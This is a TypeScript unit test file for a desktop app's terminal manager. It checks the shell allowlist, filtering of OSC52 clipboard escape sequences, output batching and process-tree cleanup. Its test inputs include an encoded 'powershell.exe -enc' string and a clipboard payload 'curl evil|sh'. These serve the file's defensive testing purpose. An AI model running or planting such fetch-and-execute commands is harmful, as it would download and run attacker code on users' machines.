// F-3 PtyManager 單元測試。
// - 真實 node-pty（temp 工作區）：create→write 收到 data、exit 帶 exitCode、close 後 alive=false。
// - 紅軍 fail-safe：
//   A1 shell allowlist（非法 shell / 非法 wsId 一律 reject 且 spawn 從未被呼叫；5 合法 shell 只映到固定執行檔）
//   A2 OSC52 過濾（剪貼簿挾持）—— stripOsc52 純函式
//   A4 close/exit 後 write/resize 競態安全 no-op、double close 冪等
//   A5 高速輸出批次合併 + flow control（pause/resume）
//   A6 teardown 殺子程序樹（真實 child pid 不再存在；treeKill 以 process-tree 呼叫）

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { mkdtempSync, rmSync, mkdirSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { StateStore } from '../store/StateStore';
import { WorkspaceManager } from '../workspace/WorkspaceManager';
import { WorkspaceLifecycle } from '../workspace/workspaceLifecycle';
import {
  PtyManager,
  stripOsc52,
  resolveShellFile,
  resolveShellArgs,
  VALID_SHELLS,
  OSC52_WRITE_MAX_B64,
  OSC52_CARRY_CAP,
  type ManagedPty,
  type SpawnFn,
} from './PtyManager';

// ── 測試輔助 ──
const delay = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));

// PTY（ConPTY）關閉後底層程序釋放 cwd handle 是非同步的，afterEach 立即 rmSync 會 EPERM。
// best-effort 清理：阻塞重試數次後放棄（temp 目錄殘留無害，OS 會清）。
function safeRmrf(p: string): void {
  for (let i = 0; i < 10; i++) {
    try {
      rmSync(p, { recursive: true, force: true });
      return;
    } catch {
      const sab = new Int32Array(new SharedArrayBuffer(4));
      Atomics.wait(sab, 0, 0, 150); // 阻塞 150ms 等程序釋放 handle
    }
  }
}

async function waitFor(pred: () => boolean, ms = 12000, step = 100): Promise<boolean> {
  const end = Date.now() + ms;
  while (Date.now() < end) {
    if (pred()) return true;
    await delay(step);
  }
  return pred();
}

function isAlive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch (e) {
    return (e as NodeJS.ErrnoException).code === 'EPERM';
  }
}

/** 受測 ManagedPty 假件（驅動 onData / 計數 pause/resume/kill）—— 僅用於演算法行為測試。 */
class FakePty implements ManagedPty {
  readonly pid: number;
  process = 'fake.exe';
  dataCb: ((d: Buffer | string) => void) | null = null;
  exitCb: ((e: { exitCode: number; signal?: number }) => void) | null = null;
  paused = 0;
  resumed = 0;
  killed = 0;
  written: string[] = [];
  constructor(pid = Math.floor(Math.random() * 100000) + 1000) {
    this.pid = pid;
  }
  onData(cb: (d: Buffer | string) => void): { dispose(): void } {
    this.dataCb = cb;
    return { dispose: () => (this.dataCb = null) };
  }
  onExit(cb: (e: { exitCode: number; signal?: number }) => void): { dispose(): void } {
    this.exitCb = cb;
    return { dispose: () => (this.exitCb = null) };
  }
  resize(): void {
    /* no-op */
  }
  write(d: string): void {
    this.written.push(d);
  }
  kill(): void {
    this.killed++;
  }
  pause(): void {
    this.paused++;
  }
  resume(): void {
    this.resumed++;
  }
  feed(buf: Buffer): void {
    this.dataCb?.(buf);
  }
}

function setup() {
  const root = mkdtempSync(join(tmpdir(), 'polydesk-pty-'));
  const userData = join(root, 'userData');
  mkdirSync(userData, { recursive: true });
  const store = new StateStore(join(userData, 'state.json'));
  store.load();
  const lifecycle = new WorkspaceLifecycle();
  const workspaces = new WorkspaceManager(store, lifecycle, userData);
  const wsDir = join(root, 'project');
  mkdirSync(wsDir, { recursive: true });
  const added = workspaces.add({ path: wsDir });
  if (!('id' in added)) throw new Error('建立測試工作區失敗');
  return { root, userData, lifecycle, workspaces, wsId: added.id, wsDir };
}

describe('PtyManager 安全：shell allowlist（F-3-A1）', () => {
  let ctx: ReturnType<typeof setup>;
  beforeEach(() => {
    ctx = setup();
  });
  afterEach(() => {
    safeRmrf(ctx.root);
  });

  it('非法 shell 字串一律 reject 且 node-pty.spawn 從未被呼叫', () => {
    const spawn = vi.fn<SpawnFn>(() => new FakePty());
    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, { spawn });
    // 半可信 renderer 嘗試把任意執行檔/帶旗標字串餵進來
    expect(() => mgr.create({ wsId: ctx.wsId, shell: 'C:\\Windows\\System32\\calc.exe' as never })).toThrow();
    expect(() => mgr.create({ wsId: ctx.wsId, shell: 'powershell.exe -enc AAAA' as never })).toThrow();
    expect(() => mgr.create({ wsId: ctx.wsId, shell: 'notashell' as never })).toThrow();
    expect(spawn).not.toHaveBeenCalled();
  });

  it('非法 / status!=ok 的 wsId 一律 reject 且不 spawn（cwd 不落到安裝目錄）', () => {
    const spawn = vi.fn<SpawnFn>(() => new FakePty());
    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, { spawn });
    expect(() => mgr.create({ wsId: 'does-not-exist', shell: 'powershell' })).toThrow();
    expect(spawn).not.toHaveBeenCalled();
  });

  it('5 個合法 ShellKind 只會以固定執行檔被 spawn（gitbash 只在寫死路徑間選）', () => {
    const calls: string[] = [];
    const spawn = vi.fn<SpawnFn>((file) => {
      calls.push(file);
      return new FakePty();
    });
    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, { spawn });
    for (const shell of VALID_SHELLS) mgr.create({ wsId: ctx.wsId, shell });
    expect(calls).toEqual([
      'powershell.exe',
      'cmd.exe',
      'pwsh.exe',
      resolveShellFile('gitbash'), // 'C:\\Program Files\\Git\\bin\\bash.exe' 或 fallback 'bash.exe'
      'wsl.exe',
    ]);
    // gitbash 解析結果必為兩個寫死值之一，絕不採 caller 字串
    expect(['C:\\Program Files\\Git\\bin\\bash.exe', 'bash.exe']).toContain(resolveShellFile('gitbash'));
  });

  it('resolveShellArgs：powershell/cmd 注入 UTF-8 初始化、pwsh/gitbash/wsl 免動（回 []）', () => {
    const ps = resolveShellArgs('powershell');
    expect(ps).toContain('-NoLogo');
    expect(ps).toContain('-NoExit');
    expect(ps.join(' ')).toMatch(/chcp 65001/);
    expect(resolveShellArgs('cmd')).toEqual(['/K', 'chcp 65001 >nul']);
    expect(resolveShellArgs('pwsh')).toEqual([]);
    expect(resolveShellArgs('gitbash')).toEqual([]);
    expect(resolveShellArgs('wsl')).toEqual([]);
  });
});

describe('stripOsc52 OSC52 攔截（F-3-A2：序列不進 renderer；寫入解出、查詢封死）', () => {
  const b64 = (s: string): string => Buffer.from(s).toString('base64');

  it('BEL 終止的 OSC52 自輸出移除、寫入 payload 解出（2026-07-02 拍板放寬）', () => {
    const input = Buffer.from(`before\x1b]52;c;${b64('PWNED curl evil|sh')}\x07after`);
    const { output, carry, writes } = stripOsc52(input);
    expect(output.toString()).toBe('beforeafter');
    expect(carry.length).toBe(0);
    expect(writes).toEqual(['PWNED curl evil|sh']);
  });

  it('移除 ESC\\ (ST) 終止的 OSC52，寫入照樣解出', () => {
    const input = Buffer.from(`x\x1b]52;c;${b64('hi')}\x1b\\y`);
    const r = stripOsc52(input);
    expect(r.output.toString()).toBe('xy');
    expect(r.writes).toEqual(['hi']);
  });

  it('寫入內容為 UTF-8 中文也正確解出', () => {
    const input = Buffer.from(`\x1b]52;c;${b64('選取複製 世界')}\x07`);
    expect(stripOsc52(input).writes).toEqual(['選取複製 世界']);
  });

  it('查詢（`?`＝請終端機回報剪貼簿）一律丟棄、絕不解出（防外洩，讀取方向照封）', () => {
    const input = Buffer.from('A\x1b]52;c;?\x07B');
    const { output, writes } = stripOsc52(input);
    expect(output.toString()).toBe('AB');
    expect(writes).toEqual([]);
  });

  it('缺分號 / 空 payload 的畸形 OSC52：移除且不寫入', () => {
    expect(stripOsc52(Buffer.from('\x1b]52;garbled\x07')).writes).toEqual([]);
    expect(stripOsc52(Buffer.from('\x1b]52;c;\x07')).writes).toEqual([]);
  });

  it('超過寫入上限的 payload：移除且不寫入（防灌爆）', () => {
    const huge = 'A'.repeat(OSC52_WRITE_MAX_B64 + 4);
    const { output, writes } = stripOsc52(Buffer.from(`\x1b]52;c;${huge}\x07ok`));
    expect(output.toString()).toBe('ok');
    expect(writes).toEqual([]);
  });

  it('跨 chunk 邊界以 carry 接續移除，寫入於序列完整時解出', () => {
    const full = `\x1b]52;c;${b64('SPLIT')}\x07`;
    const cut = Math.floor(full.length / 2);
    const r1 = stripOsc52(Buffer.from('A' + full.slice(0, cut)));
    expect(r1.output.toString()).toBe('A');
    expect(r1.carry.length).toBeGreaterThan(0);
    expect(r1.writes).toEqual([]);
    const r2 = stripOsc52(Buffer.from(full.slice(cut) + 'B'), r1.carry);
    expect(r2.output.toString()).toBe('B');
    expect(r2.carry.length).toBe(0);
    expect(r2.writes).toEqual(['SPLIT']);
  });

  it('非 OSC52 的 escape（CSI 顏色）原樣保留', () => {
    const input = Buffer.from('\x1b[31mred\x1b[0m');
    expect(stripOsc52(input).output.equals(input)).toBe(true);
  });

  it('未終止且超過 carry 上限的 OSC52 不無界緩衝（資料原樣放行）', () => {
    const input = Buffer.from('\x1b]52;' + 'A'.repeat(OSC52_CARRY_CAP + 100));
    const { output, carry, writes } = stripOsc52(input);
    expect(carry.length).toBe(0);
    expect(output.length).toBeGreaterThan(OSC52_CARRY_CAP);
    expect(writes).toEqual([]);
  });
});

describe('PtyManager 高速輸出批次合併 + flow control（F-3-A5）', () => {
  let ctx: ReturnType<typeof setup>;
  beforeEach(() => {
    ctx = setup();
    vi.useFakeTimers();
  });
  afterEach(() => {
    vi.useRealTimers();
    safeRmrf(ctx.root);
  });

  it('一 tick 內 50×100KB chunk → emitData 合併（遠少於 50）、超門檻 pause()、消化後 resume()', () => {
    const fake = new FakePty();
    const spawn: SpawnFn = () => fake;
    const emitData = vi.fn();
    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, {
      spawn,
      emitData,
      flushIntervalMs: 16,
      highWaterBytes: 512 * 1024,
      stripClipboard: false,
    });
    mgr.create({ wsId: ctx.wsId, shell: 'powershell' });

    const chunk = Buffer.alloc(100 * 1024, 0x79); // 'y'
    for (let i = 0; i < 50; i++) fake.feed(chunk);

    // 計時器尚未觸發：未直通轉送（直通會是 50 次）
    expect(emitData.mock.calls.length).toBeLessThan(50);
    // 累積遠超門檻 → 已 backpressure
    expect(fake.paused).toBeGreaterThanOrEqual(1);

    vi.advanceTimersByTime(20); // 觸發 flush
    expect(emitData).toHaveBeenCalledTimes(1); // 合併成單次
    const sent = emitData.mock.calls[0][0] as { chunk: Uint8Array };
    expect(sent.chunk.length).toBe(50 * 100 * 1024);
    expect(fake.resumed).toBeGreaterThanOrEqual(1); // 消化後恢復
  });

  it('OSC52 寫入經 flush 交給 writeClipboard、序列不進 emitData；查詢不觸發寫入', () => {
    const fake = new FakePty();
    const spawn: SpawnFn = () => fake;
    const emitData = vi.fn();
    const writeClipboard = vi.fn();
    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, {
      spawn,
      emitData,
      writeClipboard,
      flushIntervalMs: 16,
    });
    mgr.create({ wsId: ctx.wsId, shell: 'powershell' });

    const b64 = Buffer.from('copied!').toString('base64');
    fake.feed(Buffer.from(`out\x1b]52;c;${b64}\x07\x1b]52;c;?\x07put`));
    vi.advanceTimersByTime(20);

    expect(writeClipboard).toHaveBeenCalledTimes(1);
    expect(writeClipboard).toHaveBeenCalledWith('copied!');
    const sent = emitData.mock.calls[0][0] as { chunk: Uint8Array };
    expect(Buffer.from(sent.chunk).toString()).toBe('output'); // 兩段 OSC52 皆未進 renderer
  });
});

describe('PtyManager teardown 殺子程序樹（F-3-A6）', () => {
  let ctx: ReturnType<typeof setup>;
  beforeEach(() => {
    ctx = setup();
  });
  afterEach(() => {
    safeRmrf(ctx.root);
  });

  it('teardown 以 process-tree 方式 treeKill 每個 alive 終端機並自清單移除', () => {
    const p1 = new FakePty(11111);
    const p2 = new FakePty(22222);
    const queue = [p1, p2];
    const spawn: SpawnFn = () => queue.shift() as FakePty;
    const killed: number[] = [];
    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, {
      spawn,
      treeKill: (pid) => {
        killed.push(pid);
      },
      emitData: vi.fn(),
    });
    mgr.create({ wsId: ctx.wsId, shell: 'powershell' });
    mgr.create({ wsId: ctx.wsId, shell: 'cmd' });
    expect(mgr.list(ctx.wsId).length).toBe(2);

    // 移除工作區 → lifecycle 觸發 'pty' teardown
    void ctx.lifecycle.teardown(ctx.wsId);
    expect(killed.sort()).toEqual([11111, 22222]);
    expect(mgr.list(ctx.wsId).length).toBe(0);
  });

  it(
    '真實：終端機內前景子程序在 teardown 後不再存在（無殘留）',
    async () => {
      const pidfile = join(ctx.wsDir, 'child.pid').replace(/\\/g, '/');
      const exits: { termId: string; exitCode: number }[] = [];
      const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, {
        emitData: vi.fn(),
        emitExit: (p) => exits.push(p),
        flushIntervalMs: 10,
      });
      const { termId } = mgr.create({ wsId: ctx.wsId, shell: 'powershell' });
      expect(termId).toBeTruthy();

      // 在終端機內起一個長存的前景子程序（node），把自身 pid 寫到檔案
      const js = `const fs=require('fs');fs.writeFileSync('${pidfile}',String(process.pid));setInterval(()=>{},1e9)`;
      mgr.write(termId, `node -e "${js}"\r`);

      const got = await waitFor(() => existsSync(pidfile), 15000);
      expect(got).toBe(true);
      const childPid = parseInt(readFileSync(pidfile, 'utf8').trim(), 10);
      expect(Number.isFinite(childPid)).toBe(true);
      expect(isAlive(childPid)).toBe(true);

      // teardown 整個工作區
      await ctx.lifecycle.teardown(ctx.wsId);

      const dead = await waitFor(() => !isAlive(childPid), 15000);
      expect(dead).toBe(true);
      expect(mgr.list(ctx.wsId).length).toBe(0);
    },
    40000,
  );
});

describe('PtyManager 真實 node-pty 生命週期（REQ-TERM-001/006/004）', () => {
  let ctx: ReturnType<typeof setup>;
  beforeEach(() => {
    ctx = setup();
  });
  afterEach(() => {
    safeRmrf(ctx.root);
  });

  it('create → write 指令 → 收到 data（含輸出標記）', async () => {
    const chunks: Buffer[] = [];
    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, {
      emitData: (p) => chunks.push(Buffer.from(p.chunk)),
      emitExit: vi.fn(),
      flushIntervalMs: 10,
    });
    const { termId } = mgr.create({ wsId: ctx.wsId, shell: 'powershell' });
    mgr.write(termId, 'echo POLY_MARK_7788\r');

    const seen = await waitFor(() => Buffer.concat(chunks).toString('utf8').includes('POLY_MARK_7788'), 15000);
    expect(seen).toBe(true);
    mgr.close({ termId });
  });

  it('write 指令使 shell 結束 → onExit 帶 exitCode、list 標 alive=false', async () => {
    const exits: { termId: string; exitCode: number }[] = [];
    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, {
      emitData: vi.fn(),
      emitExit: (p) => exits.push(p),
      flushIntervalMs: 10,
    });
    const { termId } = mgr.create({ wsId: ctx.wsId, shell: 'powershell' });
    mgr.write(termId, 'exit\r');

    const exited = await waitFor(() => exits.some((e) => e.termId === termId), 15000);
    expect(exited).toBe(true);
    expect(typeof exits[0].exitCode).toBe('number');
    // 自然結束保留在清單（alive=false），供 UI 顯示「重啟」
    const t = mgr.list(ctx.wsId).find((x) => x.termId === termId);
    expect(t?.alive).toBe(false);
  });
});

describe('PtyManager 關閉時序競態安全（F-3-A4）', () => {
  let ctx: ReturnType<typeof setup>;
  beforeEach(() => {
    ctx = setup();
  });
  afterEach(() => {
    safeRmrf(ctx.root);
  });

  it('create→close 後 write/resize 安全 no-op；double close 皆回 {ok:true} 不丟例外', () => {
    const fake = new FakePty();
    const spawn: SpawnFn = () => fake;
    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, {
      spawn,
      emitData: vi.fn(),
      treeKill: vi.fn(),
    });
    const { termId } = mgr.create({ wsId: ctx.wsId, shell: 'powershell' });

    expect(mgr.close({ termId })).toEqual({ ok: true });
    const writtenBefore = fake.written.length;

    // 事後 write/resize 不得丟例外、且不再寫入已死 pty
    expect(() => mgr.write(termId, 'should-be-dropped')).not.toThrow();
    expect(() => mgr.resize({ termId, cols: 100, rows: 30 })).not.toThrow();
    expect(fake.written.length).toBe(writtenBefore);

    // 第二次 close（已刪除）冪等
    expect(mgr.close({ termId })).toEqual({ ok: true });
    // 對未知 termId 也安全
    expect(mgr.close({ termId: 'never-existed' })).toEqual({ ok: true });
    expect(() => mgr.write('never-existed', 'x')).not.toThrow();
  });

  it('resize 以「實際套用成功」去重：同尺寸重送不打 pty；失敗不記帳→下次重送重試（自癒）', () => {
    // 自訂 fake：計數 + 可注入一次失敗
    let calls = 0;
    let failNext = false;
    class ResizeFake extends FakePty {
      override resize(): void {
        calls++;
        if (failNext) {
          failNext = false;
          throw new Error('conpty resize failed');
        }
      }
    }
    const fake = new ResizeFake();
    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, {
      spawn: () => fake,
      emitData: vi.fn(),
      treeKill: vi.fn(),
    });
    const { termId } = mgr.create({ wsId: ctx.wsId, shell: 'powershell' });

    // 同尺寸重送 → 只打一次 pty（main 端去重，ConPTY 不被重複打擾）
    mgr.resize({ termId, cols: 120, rows: 40 });
    mgr.resize({ termId, cols: 120, rows: 40 });
    mgr.resize({ termId, cols: 120, rows: 40 });
    expect(calls).toBe(1);

    // 失敗不記帳：這次 resize 丟例外 → applied 停在 120x40 → 同目標尺寸重送會「再試」
    failNext = true;
    mgr.resize({ termId, cols: 120, rows: 46 });
    expect(calls).toBe(2); // 有嘗試但失敗
    mgr.resize({ termId, cols: 120, rows: 46 }); // 重送 → 重試成功
    expect(calls).toBe(3);
    mgr.resize({ termId, cols: 120, rows: 46 }); // 已套用 → 去重
    expect(calls).toBe(3);
  });
});
